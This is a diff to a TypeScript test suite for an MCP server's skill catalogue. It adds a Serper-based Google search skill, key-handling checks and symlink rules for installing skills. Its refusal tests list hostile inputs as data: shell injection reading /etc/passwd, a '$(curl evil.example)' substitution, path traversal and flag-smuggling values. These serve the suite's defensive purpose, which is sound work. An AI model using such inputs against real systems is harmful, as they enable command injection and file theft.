@@ -13,6 +13,7 @@ import {
   GOOGLE_NEWS_SKILL,
   KR_STOCK_SKILL,
   SAFE_TEXT,
+  SEARCH_GOOGLE_SKILL,
   SELFTEST_SKILL,
   SKILL_CATALOGUE,
   SKILL_SECRET_NAMES,
@@ -31,6 +32,7 @@ import { McpTokens } from "../src/isolation/tokens.js";
 import {
   checkInstalled,
   checkSpec,
+  findSource,
   installSkill,
   loadInstalledSkills,
   MANIFEST,
@@ -145,6 +147,7 @@ describe("skill catalogue (#21, PRD §7)", () => {
         "dart-investment-monitor",
         "news-search-skill",
         "google-news-search-skill",
+        "search-google",
         "realtime-lookup-skill",
         "summarize",
         "pdf",
@@ -166,7 +169,10 @@ describe("skill catalogue (#21, PRD §7)", () => {
       "ALPHAVANTAGE_API_KEY",
       "GEMINI_API_KEY",
       "OPENDART_API_KEY",
+      // #173: the audio transcription fallback (OpenRouter), used by the server itself — never handed to a skill.
+      "OPENROUTER_API_KEY",
       "SEC_USER_AGENT",
+      "SERPER_API_KEY",
     ]);
     // The other finance skills are served as finance tools (#30).
     for (const n of ["us-stock-skill", "market-disclosure-monitor", "dart-investment-monitor"])
@@ -201,6 +207,30 @@ describe("skill catalogue (#21, PRD §7)", () => {
     expect(KR_STOCK_SKILL.args({ command: "stock", code: "KOSPI" })).toBeUndefined();
     expect(KR_STOCK_SKILL.args({ command: "index", code: "005930" })).toBeUndefined();
     expect(KR_STOCK_SKILL.args({ command: "alpha-quote", code: "aapl" })).toBeUndefined();
+  });
+
+  it("search-google (#171): fixed flags, Korean locale by default, always --raw (the script's JSON mode)", () => {
+    expect(SEARCH_GOOGLE_SKILL.args({ query: "삼성전자 실적" })).toEqual([
+      "--type=search",
+      "--q=삼성전자 실적",
+      "--gl=kr",
+      "--hl=ko",
+      "--raw",
+    ]);
+    expect(
+      SEARCH_GOOGLE_SKILL.args({ query: "AI", type: "news", gl: "us", hl: "en", tbs: "d", page: 2, num: 5 }),
+    ).toEqual(["--type=news", "--q=AI", "--gl=us", "--hl=en", "--tbs=d", "--page=2", "--num=5", "--raw"]);
+    // Text that looks like more flags stays inside the one --q element; --no-resolve can never be asked for.
+    const a = SEARCH_GOOGLE_SKILL.args({ query: "x --no-resolve --type videos" })!;
+    expect(a[1]).toBe("--q=x --no-resolve --type videos");
+    expect(a.filter((x) => x.startsWith("--type"))).toEqual(["--type=search"]);
+    expect(a).not.toContain("--no-resolve");
+    // The key goes out in its header, on Serper's host only; never an argument.
+    expect(SEARCH_GOOGLE_SKILL.hosts).toEqual(["google.serper.dev"]);
+    expect(SEARCH_GOOGLE_SKILL.secrets).toEqual([
+      { env: "SERPER_API_KEY", place: { host: "google.serper.dev", header: "X-API-KEY" } },
+    ]);
+    expect(SEARCH_GOOGLE_SKILL.maxCallsPerRun).toBe(5);
   });
 
   it("SAFE_TEXT refuses shell metacharacters, control characters and flag-looking text", () => {
@@ -261,12 +291,13 @@ describe("skill calls through the MCP server: allow-list and argument checks (#2
     const { calls, runSkill } = recorder();
     const { svc, issue } = service({
       users: [MOM],
-      skills: [at(GOOGLE_NEWS_SKILL), at(KR_STOCK_SKILL)],
+      skills: [at(GOOGLE_NEWS_SKILL), at(KR_STOCK_SKILL), at(SEARCH_GOOGLE_SKILL)],
       runSkill,
     });
     const client = await connect((await svc.endpoint()).url, issue("u-mom"));
     const news = "skill_google-news-search-skill";
     const kr = "skill_kr-stock-skill";
+    const google = "skill_search-google";
     const refused: [string, Record<string, unknown>][] = [
       [news, { query: "x; cat /etc/passwd" }],
       [news, { query: "$(curl evil.example)" }],
@@ -288,6 +319,19 @@ describe("skill calls through the MCP server: allow-list and argument checks (#2
       [kr, { command: "alpha-quote", code: "AAPL", apikey: "x" }],
       [kr, { command: "stock", code: "../../../etc/passwd" }],
       [kr, { command: "stock", code: "/etc/passwd" }],
+      [google, { query: "x; cat /etc/passwd" }],
+      [google, { query: "--no-resolve" }],
+      [google, { query: "ok", raw: false }], // a flag the definition does not have
+      [google, { query: "ok", noResolve: true }],
+      [google, { query: "ok", type: "images" }],
+      [google, { query: "ok", type: "search --no-resolve" }],
+      [google, { query: "ok", gl: "kr --no-resolve" }],
+      [google, { query: "ok", gl: "KOR" }],
+      [google, { query: "ok", hl: "--x" }],
+      [google, { query: "ok", tbs: "qdr:d" }], // the short form only
+      [google, { query: "ok", page: 100 }],
+      [google, { query: "ok", num: 100 }], // more results cost more credits
+      [google, { query: "x".repeat(301) }],
     ];
     for (const [name, args] of refused)
       expect(errorOf(await client.callTool({ name, arguments: args })), JSON.stringify(args)).toBeTruthy();
@@ -596,7 +640,11 @@ describe("server skill folder: install copies only listed files, refuses links a
     expect(fs.readFileSync(path.join(installed, "scripts", "google_news_search.py"), "utf8")).toContain("v");
     expect(fs.readdirSync(root)).toEqual(["google-news-search-skill"]);
     const { skills, states } = loadInstalledSkills(root, SKILL_SPECS);
-    expect(states).toEqual({ "google-news-search-skill": "installed", "kr-stock-skill": "not_installed" });
+    expect(states).toEqual({
+      "google-news-search-skill": "installed",
+      "kr-stock-skill": "not_installed",
+      "search-google": "not_installed",
+    });
     // It runs from its pinned copy, not from the install folder.
     expect(skills.map((s) => s.name)).toEqual(["google-news-search-skill"]);
     expect(path.dirname(skills[0]!.dir)).toBe(path.join(fs.realpathSync(root), PINNED));
@@ -656,6 +704,36 @@ describe("server skill folder: install copies only listed files, refuses links a
 
     expect(fs.existsSync(path.join(root, "google-news-search-skill"))).toBe(false);
     expect(fs.existsSync(root) ? fs.readdirSync(root) : []).toEqual([]); // no half-written temp folders left
+  });
+
+  it("#171: a skill folder that is itself a symlink in a source folder (~/.claude/skills/x → ~/Dev/skills/x) is found by its real path; links inside it are still refused", () => {
+    const real = tmp("dev-skills-");
+    const dir = path.join(real, "search-google");
+    fs.mkdirSync(path.join(dir, "scripts"), { recursive: true });
+    fs.writeFileSync(path.join(dir, "scripts", "serper_search.py"), "print('{}')\n");
+    fs.writeFileSync(path.join(dir, ".env"), "SERPER_API_KEY=test-serper-key-0000\n"); // never copied
+    const source = tmp("claude-skills-");
+    fs.symlinkSync(dir, path.join(source, "search-google"));
+    const found = findSource("search-google", [tmp("empty-"), source])!;
+    expect(found).toBe(fs.realpathSync(dir));
+    const root = path.join(tmp("data-"), "skills");
+    expect(Object.keys(installSkill(SEARCH_GOOGLE_SKILL, found, root).files)).toEqual([
+      "scripts/serper_search.py",
+    ]);
+    expect(fs.readdirSync(path.join(root, "search-google")).sort()).toEqual([MANIFEST, "scripts"]);
+    expect(checkInstalled(SEARCH_GOOGLE_SKILL, root).state).toBe("installed");
+    // The top-level link is the admin's layout; a link anywhere below it is not.
+    const outside = path.join(tmp("outside-"), "serper_search.py");
+    fs.writeFileSync(outside, "print(1)");
+    fs.rmSync(path.join(dir, "scripts", "serper_search.py"));
+    fs.symlinkSync(outside, path.join(dir, "scripts", "serper_search.py"));
+    expect(() => installSkill(SEARCH_GOOGLE_SKILL, findSource("search-google", [source])!, root)).toThrow(
+      /symlink/,
+    );
+    // A dangling top-level link is simply not found.
+    const dangling = tmp("dangling-");
+    fs.symlinkSync(path.join(real, "missing"), path.join(dangling, "search-google"));
+    expect(findSource("search-google", [dangling])).toBeUndefined();
   });
 
   it("an installed copy that changed is not offered: edited, extra file, symlink, hard link, folder swapped", () => {
@@ -1113,7 +1191,8 @@ print(json.dumps(out))
 
 /**
  * Live checks against the real skills in the admin's folders (macOS, network). Opt in with SKILLS_LIVE=1 (and
- * TEST_SKILL_PYTHON or uv); the Alpha Vantage call additionally needs ALPHAVANTAGE_API_KEY and is skipped otherwise.
+ * TEST_SKILL_PYTHON or uv); the Alpha Vantage call additionally needs ALPHAVANTAGE_API_KEY and the search-google call
+ * SERPER_API_KEY (one Serper credit), each skipped otherwise.
  */
 const LIVE = process.env.SKILLS_LIVE === "1" && !!PY;
 describe.skipIf(!LIVE)("real skills, live (SKILLS_LIVE=1)", () => {
@@ -1134,9 +1213,12 @@ describe.skipIf(!LIVE)("real skills, live (SKILLS_LIVE=1)", () => {
         skills: [SELFTEST_SKILL, ...skills],
         installed: states,
         python: (pythonRuntime(PY) as { ok: true; runtime: { exe: string; root: string } }).runtime,
-        secrets: process.env.ALPHAVANTAGE_API_KEY
-          ? { ALPHAVANTAGE_API_KEY: process.env.ALPHAVANTAGE_API_KEY }
-          : {},
+        secrets: {
+          ...(process.env.ALPHAVANTAGE_API_KEY
+            ? { ALPHAVANTAGE_API_KEY: process.env.ALPHAVANTAGE_API_KEY }
+            : {}),
+          ...(process.env.SERPER_API_KEY ? { SERPER_API_KEY: process.env.SERPER_API_KEY } : {}),
+        },
       },
     );
     closers.push(() => svc.close());
@@ -1167,5 +1249,15 @@ describe.skipIf(!LIVE)("real skills, live (SKILLS_LIVE=1)", () => {
     const alpha = await call("skill_kr-stock-skill", { command: "alpha-quote", code: "AAPL" });
     if (process.env.ALPHAVANTAGE_API_KEY) expect(alpha.out).toMatchObject({ provider: "Alpha Vantage" });
     else expect(alpha.error).toBe("skill_unconfigured"); // live call skipped: no key in this environment
+  }, 120_000);
+
+  it("search-google (#171): Serper web search with the key from SERPER_API_KEY (skipped without it)", async () => {
+    const { call } = await liveService();
+    const r = await call("skill_search-google", { query: "삼성전자", num: 3 });
+    if (!process.env.SERPER_API_KEY) return expect(r.error).toBe("skill_unconfigured");
+    expect(r.error).toBeUndefined();
+    expect((r.out!.organic as unknown[]).length).toBeGreaterThan(0);
+    // Real links after /resolve (a Google redirect left over would not be a source).
+    expect(SEARCH_GOOGLE_SKILL.searchHits!(r.out).length).toBeGreaterThan(0);
   }, 120_000);
 });
